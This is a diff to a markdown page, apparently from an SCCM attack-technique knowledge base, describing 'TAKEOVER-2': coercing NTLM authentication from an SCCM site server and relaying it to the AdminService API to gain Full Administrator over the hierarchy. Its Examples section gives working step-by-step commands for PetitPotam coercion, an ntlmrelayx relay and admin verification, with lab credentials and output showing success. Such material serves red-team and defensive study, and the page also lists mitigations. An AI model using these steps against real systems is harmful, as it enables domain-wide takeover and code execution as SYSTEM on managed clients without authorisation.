@@ -4,11 +4,30 @@
 - TAKEOVER-2
 
 ## MITRE ATT&CK TTPs
-- [T1078.002](https://attack.mitre.org/techniques/T1078/002/) - Valid Accounts
-- [T1187](https://attack.mitre.org/techniques/T1187/) - Forced Authentication
+- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
+- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
 
 ## Requirements
-Valid domain credentials with network connectivity to the primary site server and SMS Provider.
+
+### Coercion
+- Valid Active Directory domain credentials
+- Connectivity to SMB (TCP/445) on a coercion target:
+    - TAKEOVER-2.1: Primary site server 
+    - TAKEOVER-2.2: Passive site server
+    - TAKEOVER-2.3: CAS site server
+
+- Connectivity from the coercion target to SMB (TCP/445) on the relay server
+- Coercion target settings:
+    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
+    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
+    - Domain computer account is not in `Protected Users`
+- Domain controller settings:
+    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target
+    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target
+
+### Relay
+- Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the SMS Provider role
+
 
 ## Summary
 
@@ -18,19 +37,23 @@ The SMS Provider also provides access to the site database via the administratio
 
 ## Impact
 
-This technique may allow an attacker to relay a primary site server machine account to a remote SMS Provider and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables lateral movement to all SCCM clients and/or sensitive systems.
+This technique may allow an attacker to relay a site server machine account to a remote SMS Provider and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables an attacker to execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on.
 
 ## Defensive IDs
-- [PREVENT-8: Require PKI certificates for client authentation](../../../defense-techniques/PREVENT/PREVENT-8/prevent-8_description.md)
+
 - [PREVENT-9: Enforce MFA for SMS Provider calls](../../../defense-techniques/PREVENT/PREVENT-9/prevent-9_description.md)
 - [DETECT-4: Monitor SMS Admins group membership](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)
 
-## Examples
-- Use SCCMHunter to profile SCCM component server roles
-- Use PetitPotam to coerce authentication from primary site server
-- Use NTLMrelayx to relay credentials to remote SMS Provider
+## Subtechniques
+- TAKEOVER-2.1: NTLM relay primary site server SMB to AdminService on remote SMS Provider
+- TAKEOVER-2.2: NTLM relay passive site server SMB to AdminService on remote SMS Provider
+- TAKEOVER-2.3: NTLM relay CAS site server SMB to AdminService on remote SMS Provider
 
-### SCCMHunter
+
+## Examples
+
+1. Use `SCCMHunter` to  profile SCCM infrastructure.
+
 ```
 [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
 [02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
@@ -42,31 +65,10 @@ This technique may allow an attacker to relay a primary site server machine acco
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
 ```
 
-### PetitPotam
+2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the AdminService API on the remote SMS Provider identified in the previous step, and provide a target account to add as a Full Administrator.
 
 ```
-┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
-
-Trying pipe lsarpc
-[-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
-[+] Connected!
-[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
-[+] Successfully bound!
-[-] Sending EfsRpcOpenFileRaw!
-[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
-[+] OK! Using unpatched function!
-[-] Sending EfsRpcEncryptFileSrv!
-[+] Got expected ERROR_BAD_NETPATH exception!!
-[+] Attack worked!
-
-```
-
-### NTLMRelayx
-
-```
-┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/adminservice/examples]
-└─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\secter" --objectsid "S-1-5-21-2391214593-4168590120-2599633397-1133" -smb2support -t https://provider.internal.lab/AdminService/wmi/SMS_Admin
+└─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\specter" --objectsid <USER SID> -smb2support -t https://SMS_PROVIDER_URL_OR_IP/AdminService/wmi/SMS_Admin
 Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
 
 [*] Protocol Client SMB loaded..
@@ -86,6 +88,35 @@ Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
 [*] Setting up WCF Server
 [*] Setting up RAW Server on port 6666
 
+```
+
+
+3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:
+
+
+```
+┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
+└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+
+```
+After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the AdminService on the SMS Provider to add a Full Administrator:
+
+```
+┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/adminservice/examples]
+
+
 [*] Servers started, waiting for connections
 [*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.121, attacking target https://provider.internal.lab
 [*] Exiting standard auth flow to add SCCM admin...
@@ -94,6 +125,21 @@ Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
 [*] Server returned code 201, attack successful
 
 ```
+
+
+4. Confirm that the account now has the `Full Administrator` role by querying WMI on an SMS Provider.
+
+    With `sccmhunter`:
+    ```
+    $ python3 sccmhunter.py  admin -u specter -p <PASSWORD> -ip SITE-SMS          
+
+    [14:16:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
+    () (C:\) >> show_admins
+    [14:17:11] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
+    [14:17:12] INFO     Current Full Admin Users:
+    [14:17:13] INFO     lab\Administrator 
+    [14:17:13] INFO     lab\specter 
+    ```
 
 ## References
 - Garrett Foster, Site Takeover via SCCM’s AdminService API, https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf
